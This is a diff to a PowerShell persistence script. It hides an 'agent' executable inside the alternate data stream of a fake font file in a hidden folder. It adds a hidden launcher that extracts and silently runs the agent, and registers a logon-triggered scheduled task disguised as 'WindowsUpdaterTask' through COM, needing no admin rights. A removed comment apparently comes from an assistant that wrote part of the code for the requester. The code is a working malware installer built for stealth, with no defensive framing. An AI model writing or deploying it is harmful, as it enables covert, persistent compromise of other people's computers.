@@ -11,42 +11,77 @@ $fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
 if (-not (Test-Path $fontDir)) {
     New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
     attrib +h $fontDir
+    Write-Output "[+] Created hidden fonts folder"
 }
+
 $fontFile = "$fontDir\seguibl.ttf"
 if (-not (Test-Path $fontFile)) {
-    $fakeFontContent = "TTF fake font file – do not delete"
+    # Use a normal hyphen (not em dash) and simple text
+    $fakeFontContent = "TTF fake font file - do not delete"
     Set-Content -Path $fontFile -Value $fakeFontContent -Encoding ASCII -Force
     attrib +h $fontFile
+    Write-Output "[+] Created fake font file: $fontFile"
+} else {
+    Write-Output "[+] Using existing font file: $fontFile"
 }
 
 # --- 2. Hide agent in ADS ---
 $streamName = "Zone.Identifier"
+Write-Output "[+] Hiding agent in ADS: $fontFile`:$streamName"
 $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
 Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
 $hiddenPath = "$fontFile`:$streamName"
 
-# --- 3. Create launcher script in the same folder ---
+# --- 3. Create launcher script in the same folder (using string concatenation) ---
 $launcherPath = "$fontDir\run.ps1"
 $launcherContent = @"
 `$fontFile = '$fontFile'
 `$streamName = '$streamName'
 `$tempAgent = "`$env:TEMP\agent.exe"
-`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw
-[System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
-Start-Process -WindowStyle Hidden `$tempAgent
+`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
+if (`$bytes) {
+    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
+    Start-Process -WindowStyle Hidden `$tempAgent
+}
 "@
 Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
 attrib +h $launcherPath
+Write-Output "[+] Created launcher: $launcherPath"
 
-# --- 4. Create scheduled task pointing to the permanent script ---
+# --- 4. Create scheduled task via COM (no admin, no password prompt) ---
 $taskName = "WindowsUpdaterTask"
-$taskCommand = "powershell.exe -WindowStyle Hidden -File `"$launcherPath`""
-# ... (use COM or schtasks to create/update the task)
-# (I'll include the COM part for completeness, but you can keep your existing task creation code)
 
-# For example, using schtasks (if allowed):
-# schtasks /create /tn $taskName /tr "$taskCommand" /sc onlogon /ru $env:USERNAME /f /it
+try {
+    $taskService = New-Object -ComObject Schedule.Service
+    $taskService.Connect()
+    $rootFolder = $taskService.GetFolder("\")
 
+    # Delete existing task if any
+    try { $rootFolder.DeleteTask($taskName, 0) } catch { }
+
+    # Create a new task definition
+    $taskDefinition = $taskService.NewTask(0)
+    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
+    $taskDefinition.Principal.UserId = $env:USERNAME
+    $taskDefinition.Principal.LogonType = 3   # TASK_LOGON_INTERACTIVE_TOKEN
+
+    # Add logon trigger
+    $trigger = $taskDefinition.Triggers.Create(9)   # TASK_TRIGGER_LOGON
+    $trigger.UserId = $env:USERNAME
+
+    # Add action – run the launcher script
+    $action = $taskDefinition.Actions.Create(0)   # TASK_ACTION_EXEC
+    $action.Path = "powershell.exe"
+    $action.Arguments = "-WindowStyle Hidden -File `"$launcherPath`""
+
+    # Register the task (6 = UpdateOrCreate)
+    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
+    Write-Output "[+] Scheduled task '$taskName' created/updated via COM."
+} catch {
+    Write-Output "[-] Failed to create scheduled task: $_"
+}
+
+Write-Output ""
 Write-Output "✅ PERSISTENCE COMPLETE"
 Write-Output "Script location: $launcherPath"
 Write-Output "Agent hidden in: $hiddenPath"
